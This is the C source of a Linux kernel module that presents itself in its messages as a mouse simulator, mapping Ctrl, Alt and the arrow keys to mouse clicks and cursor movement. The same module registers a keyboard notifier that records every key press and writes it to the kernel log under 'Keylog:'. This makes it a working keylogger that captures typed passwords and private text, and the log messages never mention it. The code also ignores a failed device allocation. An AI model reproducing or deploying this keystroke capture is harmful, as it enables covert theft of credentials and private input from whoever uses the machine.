#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
 
MODULE_LICENSE("GPL");
 
static const char *us_keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

struct input_dev *mouse_simulator_input_dev;

void simulate_mouse_events(int keycode)
{
    switch(keycode)
    {
        // LEFT CTRL
        case 29:
            input_report_key(mouse_simulator_input_dev, BTN_LEFT, 1);
            input_report_key(mouse_simulator_input_dev, BTN_LEFT, 0);
            input_sync(mouse_simulator_input_dev);
            break;
        // LEFT ALT
        case 56:
            input_report_key(mouse_simulator_input_dev, BTN_RIGHT, 1);
            input_report_key(mouse_simulator_input_dev, BTN_RIGHT, 0);
            input_sync(mouse_simulator_input_dev);
            break;
        // UP
        case 103:
            input_report_rel(mouse_simulator_input_dev, REL_Y, -10);
            input_sync(mouse_simulator_input_dev);
            break;
        // LEFT
        case 105:
            input_report_rel(mouse_simulator_input_dev, REL_X, -10);
            input_sync(mouse_simulator_input_dev);
            break;
        // RIGHT
        case 106:
            input_report_rel(mouse_simulator_input_dev, REL_X, 10);
            input_sync(mouse_simulator_input_dev);
            break;
        // DOWN
        case 108:
            input_report_rel(mouse_simulator_input_dev, REL_Y, 10);
            input_sync(mouse_simulator_input_dev);
            break;

    }
}
 
void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_size)
{
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
    {
        const char *us_key = (shift_mask == 1)
                                ? us_keymap[keycode][1]
                                : us_keymap[keycode][0];
 
        snprintf(buf, buf_size, "%s", us_key);
    }
}
 
int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, void *_param)
{
    char keybuf[12] = {0};
    struct keyboard_notifier_param *param = _param;
 
    if (!(param->down)) return NOTIFY_OK;
 
    keycode_to_string(param->value, param->shift, keybuf, 12);
    simulate_mouse_events(param->value);
 
    if (strlen(keybuf) < 1) return NOTIFY_OK;
 
    printk(KERN_INFO "Keylog: %s", keybuf);
 
    return NOTIFY_OK;
}
 
static struct notifier_block keysniffer_blk = {
    .notifier_call = keyboard_event_handler,
};
 
static int __init keylogger_init(void)
{
    printk(KERN_INFO "mouse_simulator: initializing...");
    mouse_simulator_input_dev = input_allocate_device();
    if(!mouse_simulator_input_dev)
    {
            printk("Error in input_allocate_device()!\n");
    }

    set_bit(EV_REL, mouse_simulator_input_dev->evbit);
    set_bit(REL_X, mouse_simulator_input_dev->relbit);
    set_bit(REL_Y, mouse_simulator_input_dev->relbit);
    set_bit(EV_KEY, mouse_simulator_input_dev->evbit);
    set_bit(BTN_LEFT, mouse_simulator_input_dev->keybit);
    set_bit(BTN_RIGHT, mouse_simulator_input_dev->keybit);

    if(input_register_device(mouse_simulator_input_dev))
    {
            printk("Error in input_register_device()!\n");
    }
    register_keyboard_notifier(&keysniffer_blk);
    printk(KERN_INFO "mouse_simulator: initialization complete.");
    return 0;
}
 
static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&keysniffer_blk);
    input_unregister_device(mouse_simulator_input_dev);
    printk(KERN_INFO "mouse_simulator: unloaded.");
}
 
module_init(keylogger_init);
module_exit(keylogger_exit);